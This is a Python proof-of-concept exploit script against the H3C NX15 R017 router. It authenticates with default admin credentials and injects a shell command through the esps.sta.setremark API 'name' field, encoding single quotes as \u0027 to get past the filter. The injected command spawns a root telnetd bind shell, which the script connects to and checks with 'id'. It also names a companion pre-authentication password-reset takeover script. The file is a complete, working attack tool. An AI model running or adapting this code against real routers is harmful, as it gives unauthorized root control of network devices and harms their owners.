#!/usr/bin/env python3
import argparse
import json
import socket
import sys
import time

import requests

IAC = 255
DONT = 254
DO = 253
WONT = 252
WILL = 251


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    body = r.json()
    if body.get('code') != 0:
        if body.get('code') == 19:
            wait_time = body.get('data', {}).get('waitTime')
            raise RuntimeError(
                f'login throttled by target: waitTime={wait_time}s; '
                'wait for the throttle window to expire and retry'
            )
        if body.get('code') == 7:
            raise RuntimeError(
                'login failed: current web admin password is not the PoC default '
                '`admin123`; pass the real password with `--password`, or reset it '
                'first with `IOT_Vul/H3C/NX15R017/pre_auth_pwd_change/preauth_login_modify_takeover.py`'
            )
        raise RuntimeError(f'login failed: {body}')
    return body['data']['session']


def esps_raw(base: str, session: str, raw_body: str, timeout: int = 30):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=raw_body.encode(), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def wait_port(host: str, port: int, timeout: int = 20) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        s = socket.socket()
        s.settimeout(1.5)
        try:
            s.connect((host, port))
            return True
        except Exception:
            time.sleep(1)
        finally:
            try:
                s.close()
            except Exception:
                pass
    return False


class TelnetLike:
    def __init__(self, host: str, port: int, timeout: float = 5.0):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(1)

    def _recv_clean_once(self) -> str:
        data = self.sock.recv(4096)
        i = 0
        clean = b''
        while i < len(data):
            if data[i] == IAC and i + 2 < len(data):
                cmd, opt = data[i + 1], data[i + 2]
                if cmd == DO:
                    self.sock.sendall(bytes([IAC, WONT, opt]))
                elif cmd == WILL:
                    self.sock.sendall(bytes([IAC, DONT, opt]))
                i += 3
            else:
                clean += bytes([data[i]])
                i += 1
        return clean.decode('latin1', 'ignore')

    def recv_text(self, timeout: float = 1.0) -> str:
        end = time.time() + timeout
        buf = ''
        while time.time() < end:
            try:
                chunk = self._recv_clean_once()
                if chunk:
                    buf += chunk
            except socket.timeout:
                pass
            except Exception:
                break
        return buf

    def run(self, cmd: str, timeout: float = 8.0, marker: str = '__END__') -> str:
        self.sock.sendall((cmd + f'\necho {marker}\n').encode())
        out = ''
        end = time.time() + timeout
        while time.time() < end:
            out += self.recv_text(1.0)
            if marker in out:
                break
        return out

    def close(self) -> None:
        try:
            self.sock.close()
        except Exception:
            pass


def connect_shell(host: str, port: int, timeout: float = 5.0):
    t = TelnetLike(host, port, timeout=timeout)
    return t, t.recv_text(1.0)


def run_shell_cmd(sock: TelnetLike, cmd: str, end_marker: str = '__END__') -> str:
    return sock.run(cmd, timeout=8.0, marker=end_marker)


def build_raw_body(mac: str, payload_command: str) -> str:
    # Same quote-bypass constraint as esps.macfilter.modify: the raw body must
    # contain \u0027, not a literal single quote, otherwise /api/esps rejects it.
    injected = json.dumps(f"x';{payload_command};#").replace("'", "\\u0027")
    return (
        '[{'
        '"id":1,'
        '"object":"esps.sta",'
        '"method":"setremark",'
        '"param":{'
        f'"mac":{json.dumps(mac)},'
        f'"name":{injected}'
        '}}]'
    )


def cleanup(host: str, port: int, marker_path: str):
    try:
        sock, _ = connect_shell(host, port, timeout=4.0)
        kill_cmd = (
            f"pid=$(ps w | awk '/telnetd -p {port}/ && !/awk/ {{print $1}}' | head -n1); "
            f'[ -n "$pid" ] && kill "$pid"; rm -f {marker_path}; echo cleaned'
        )
        out = run_shell_cmd(sock, kill_cmd)
        log('[*] cleanup shell output:')
        print(out)
        sock.close()
    except Exception as e:
        log(f'[!] cleanup shell failed: {e}')


def main() -> int:
    ap = argparse.ArgumentParser(description='H3C NX15 R017 post-auth root RCE via esps.sta.setremark eval injection')
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--host', default='192.168.8.1', help='host used for shell connection')
    ap.add_argument('--port', type=int, default=2476, help='temporary telnetd shell port')
    ap.add_argument('--mac', default='NOT_A_MAC', help='MAC string sent to setremark; default invalid MAC proves wrapper-level injection')
    ap.add_argument('--delay', type=float, default=1.5, help='seconds to wait before checking shell')
    ap.add_argument('--cleanup', action='store_true', help='kill temporary shell and remove marker after verification')
    args = ap.parse_args()

    marker = 'STA_SETREMARK_RCE_OK'
    marker_path = '/tmp/sta_setremark_rce_marker'
    payload_cmd = f'echo {marker} >{marker_path}; /usr/sbin/telnetd -p {args.port} -l /bin/sh >/dev/null 2>&1'

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    log(f'[*] Step 2: trigger esps.sta.setremark using MAC {args.mac!r}')
    raw_body = build_raw_body(args.mac, payload_cmd)
    resp = esps_raw(args.base, session, raw_body)
    print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

    log(f'[*] Step 3: wait up to {args.delay:.1f}s + port probe for shell on {args.host}:{args.port}')
    time.sleep(args.delay)
    if not wait_port(args.host, args.port, timeout=12):
        log('[-] FAILED: temporary shell port did not open')
        return 1

    log('[*] Step 4: connect shell and verify root execution')
    sock, banner = connect_shell(args.host, args.port)
    print(banner)
    proof = run_shell_cmd(sock, f'id; uname -a; cat {marker_path} 2>/dev/null')
    print(proof)
    ok = ('uid=0(root)' in proof) and (marker in proof)
    sock.close()

    if args.cleanup:
        cleanup(args.host, args.port, marker_path)

    if ok:
        log('[+] SUCCESS: root RCE via esps.sta.setremark')
        return 0

    log('[-] FAILED: expected proof not found')
    return 1


if __name__ == '__main__':
    sys.exit(main())
